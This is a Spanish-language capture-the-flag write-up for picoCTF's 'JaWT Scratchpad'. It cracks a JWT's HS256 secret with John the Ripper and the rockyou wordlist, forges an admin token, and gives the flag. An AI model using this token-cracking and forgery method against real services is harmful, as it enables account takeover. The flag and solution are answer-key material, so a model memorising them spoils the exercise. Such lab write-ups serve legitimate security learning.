## JaWT Scratchpad

## Descripcion
Check the admin scratchpad! http://fickle-tempest.picoctf.net:55581
## Solucion
entramos a la pagina del reto, y nos muestra un mensaje que dice que la podemos usar para escribir notas, que iniciemos sesion con cualquier nombre menos el de admin por que ese es especial, entonces si ponemos cualquier cosa y revisamos las cookies, vemos que esta jwt y tiene algo que parece estar cifrado 
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiamF3dCJ9.sncNmfDqKhcJLTQkL_sLYCZ_ANEzZz_AlTW4OMnRi3g
```
si usamos una herramienta como jwt.io y pegamos ese codigo, nos dice que el algoritmo usado para este token es HS256, un token esta conformado por un header payload y signature separados por punto

ahora toca crackear la contraseña por el programa de john the ripper con el siguiente comando:
```
┌──(min㉿WIN-U49VUBQG3G3)-[~]
└─$ john token.txt -w=rockyou.txt.2
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:09 DONE (2026-03-02 16:24) 0.1063g/s 786954p/s 786954c/s 786954C/s iloverob4evax..ilovemymother89
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(min㉿WIN-U49VUBQG3G3)-[~]
└─$
```
despues de obtener la contraseña nos vamos a la pagina https://jwt.lannysport.net/
y cambiamos en user a admin, despues en la contraseña ponemos ilovepico y veremos que dice que la signature esta verificada
```
{
  "typ": "JWT",
  "alg": "HS256"
}
{
  "user": "admin"
}
ilovepico

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s
```
y de vuelta en la pagina del reto modificamos la cookie con ese token y obtendremos la bandera:
picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
## Notas
- 
## Referencias
- 